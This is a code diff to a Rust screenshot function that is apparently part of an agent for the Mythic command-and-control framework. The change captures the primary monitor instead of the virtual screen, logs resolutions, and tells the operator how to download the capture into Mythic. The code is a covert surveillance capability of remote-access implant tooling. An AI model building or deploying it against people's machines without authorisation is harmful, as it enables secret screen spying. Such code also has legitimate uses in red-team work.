@@ -29,11 +29,16 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
             return Err(format!("Failed to create memory DC. Error: {}", GetLastError()).into());
         }
 
-        // Get screen size - use virtual screen to capture all monitors
-        let width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-        let height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+        // Get screen size - use primary monitor dimensions
+        let width = GetSystemMetrics(SM_CXSCREEN);
+        let height = GetSystemMetrics(SM_CYSCREEN);
         
-        eprintln!("DEBUG: Screen resolution: {}x{}", width, height);
+        eprintln!("DEBUG: Primary screen resolution: {}x{}", width, height);
+        
+        // Also get virtual screen dimensions for comparison
+        let virtual_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+        let virtual_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+        eprintln!("DEBUG: Virtual screen resolution: {}x{}", virtual_width, virtual_height);
 
         let hbitmap: HBITMAP = CreateCompatibleBitmap(hdc_screen, width, height);
         if hbitmap.is_null() {
@@ -77,14 +82,15 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
         eprintln!("DEBUG: File size: {} bytes", screenshot_data.len());
         eprintln!("DEBUG: File exists: {}", screenshot_path.exists());
 
-        // For now, return the file path so user can download it manually
-        // TODO: Implement proper file upload to Mythic
+        // Return success with file path for manual download
+        // The browser script expects a file_id, but we'll return the path for now
         Ok(mythic_success!(
             task.id,
             format!(
-                "Screenshot saved successfully!\n\nFile Details:\n- Path: {}\n- Size: {} bytes\n- Exists: {}\n\nTo download to Mythic, use:\ndownload {}",
+                "Screenshot captured successfully!\n\nFile Details:\n- Path: {}\n- Size: {} bytes\n- Resolution: {}x{}\n- Exists: {}\n\nTo download to Mythic, use:\ndownload {}",
                 screenshot_path.to_string_lossy(),
                 screenshot_data.len(),
+                width, height,
                 screenshot_path.exists(),
                 screenshot_path.to_string_lossy()
             )
